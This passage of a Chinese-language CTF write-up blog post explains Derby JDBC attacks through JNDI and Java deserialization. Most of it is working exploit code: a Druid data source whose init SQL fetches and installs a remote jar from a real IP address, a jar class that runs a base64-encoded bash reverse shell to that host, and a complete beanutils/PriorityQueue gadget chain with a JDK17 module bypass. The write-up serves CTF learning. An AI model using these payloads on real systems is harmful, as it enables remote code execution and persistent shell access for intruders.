ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,JDBC_USER));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,JDBC_PASSWORD));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initConnectionSqls&quot;</span>,<span class="string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://8.130.24.188:8888/test3.jar&#x27;, &#x27;APP.Sample4&#x27;, 0);CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Sample4&#x27;);CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;testShell4.exec&#x27;;CALL SALES.TOTAL_REVENUES();&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;init&quot;</span>,<span class="string">&quot;true&quot;</span>));</span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line"></span><br><span class="line">            registry.bind(<span class="string">&quot;pop&quot;</span>,referenceWrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>制作恶意jar包如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testShell4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3NSA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后可以看到反弹shell<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707118580092-b5b07696-59d8-4bc8-b0ca-0638aea245b2.png#averageHue=%23cacaca&clientId=u3ebc7ad1-22f1-4&from=paste&height=676&id=u25cd8f96&originHeight=845&originWidth=1307&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49941&status=done&style=none&taskId=uf1803549-8b57-496e-b239-b5189743014&title=&width=1045.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707118574188-fc1e2cd3-8a92-4bf0-a246-47ecfcd0ea20.png#averageHue=%23ab9f84&clientId=u3ebc7ad1-22f1-4&from=paste&height=800&id=u2696431a&originHeight=1000&originWidth=1600&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=170458&status=done&style=none&taskId=u58a3433f-6aa0-4f6e-a2d6-4bfc23446c0&title=&width=1280" alt="image.png"></p>
<h1 id="Derby-Plus"><a href="#Derby-Plus" class="headerlink" title="Derby Plus"></a>Derby Plus</h1><p>Druiddatasource getter gadgets + JDBC Attack<br>入口点变成了反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.derbyplus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello derby plus&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/deserialize&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">deserialize</span><span class="params">(<span class="meta">@RequestBody</span> String body)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = Base64.getDecoder().decode(body);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                input.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                var7.addSuppressed(var6);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> var7;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>并且给了cb依赖<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707118646858-187c1829-7582-4531-9add-15fca95e7152.png#averageHue=%239db7aa&clientId=u3ebc7ad1-22f1-4&from=paste&height=326&id=u06912cdf&originHeight=408&originWidth=689&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44252&status=done&style=none&taskId=u3fa1e96b-2c0a-4eab-9209-53909a22fff&title=&width=551.2" alt="image.png"><br>已经是赤裸裸的在勾引了。打一个getter去触发getconnection，所以都不需要思考就找到了<br><code>DruidDataSource#getConnection</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707118700503-981eaf21-721a-4683-a4aa-1ddf834a902d.png#averageHue=%23292d35&clientId=u3ebc7ad1-22f1-4&from=paste&height=332&id=ubf898f24&originHeight=415&originWidth=1354&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=65470&status=done&style=none&taskId=ud543ef1f-cc45-4acb-9199-0a2d9c5c73f&title=&width=1083.2" alt="image.png"><br>并且这里刚好就有init方法，我们可以同样去打jdbc然后rce。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DerbyPlusExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> ArrayList&lt;Class&gt; classes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;java.lang.reflect.Field&quot;</span>));</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;java.lang.reflect.Method&quot;</span>));</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>));</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;java.util.Properties&quot;</span>));</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>));</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>));</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>));</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">DerbyPlusExp</span>().bypassModule(classes);</span><br><span class="line">        <span class="type">DruidDataSource</span> <span class="variable">druidDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">        druidDataSource.setUrl(<span class="string">&quot;jdbc:derby:dbname;create=true&quot;</span>);</span><br><span class="line">        druidDataSource.setDriverClassName(<span class="string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>);</span><br><span class="line">        druidDataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        <span class="type">StringTokenizer</span> <span class="variable">tokenizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(<span class="string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://8.130.24.188:8888/test3.jar&#x27;, &#x27;APP.Sample4&#x27;, 0);CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Sample4&#x27;);CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;testShell4.exec&#x27;;CALL SALES.TOTAL_REVENUES();&quot;</span>, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        druidDataSource.setConnectionInitSqls(Collections.list(tokenizer));</span><br><span class="line">        <span class="type">Class</span> <span class="variable">unsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="comment">//bypass PriorityQueue对druidDataSource的module限制，因为存在调用</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> druidDataSource.getClass().getModule();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> PriorityQueue.class;</span><br><span class="line">        <span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.putObject(currentClass, offset, baseModule);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line">        setFieldValue(druidDataSource,<span class="string">&quot;logWriter&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(druidDataSource,<span class="string">&quot;statLogger&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(druidDataSource,<span class="string">&quot;transactionHistogram&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(druidDataSource,<span class="string">&quot;initedLatch&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;druidDataSource, druidDataSource&#125;);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> base64serial(queue);</span><br><span class="line">        s.replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;%2b&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        deserTester(queue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method <span class="title function_">getMethod</span><span class="params">(Class clazz, String methodName, Class[]</span></span><br><span class="line"><span class="params">            params)</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (clazz!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName,params);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NoSuchMethodException e)&#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            unsafe = (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bypassModule</span><span class="params">(ArrayList&lt;Class&gt; classes)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">getModuleMethod</span> <span class="operator">=</span> getMethod(Class.class, <span class="string">&quot;getModule&quot;</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">if</span> (getModuleMethod != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">targetModule</span> <span class="operator">=</span> getModuleMethod.invoke(aClass, <span class="keyword">new</span></span><br><span class="line">                                <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">                        unsafe.getAndSetObject(currentClass,</span><br><span class="line">                                unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>)), targetModule);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserTester</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        base64deserial(base64serial(o));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(field != <span class="literal">null</span>) &#123;</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">base64deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>环境是JDK17，注意一下payload生成。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707118933210-09f38511-545f-4a7e-a489-3842a56aab3f.png#averageHue=%23828a4f&clientId=u3ebc7ad1-22f1-4&from=paste&height=864&id=u36cd308d&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=261078&status=done&style=none&taskId=u4ef5dfdb-b230-4dd3-8f68-5290203d528&title=&width=1536" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707118926894-66a6fdcf-7f59-4a1d-81c8-41aa61aff4f0.png#averageHue=%23323230&clientId=u3ebc7ad1-22f1-4&from=paste&height=178&id=u7f5758ae&originHeight=222&originWidth=1280&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38502&status=done&style=none&taskId=ub0e8101a-568f-4d9f-a4d0-f0fadb148ba&title=&width=1024" alt="image.png"><br>这里需要学习的点就是jdk17如何bypass module的限制，这一点其实早在Kcon2021 Beichen师傅就已经提出了，也是学到了很多。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这一次的N1 Junior的题大部分都有个共同性，就是二次思维，也就是单次Attack无法达到利用，那就double attack。Respect</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/06/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20XmlSerializer%20Deserialization%2002/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">【.NET 安全】ASP.NET XmlSerializer Deserialization 02</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">【.NET 安全】ASP.NET Deserialization 01</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
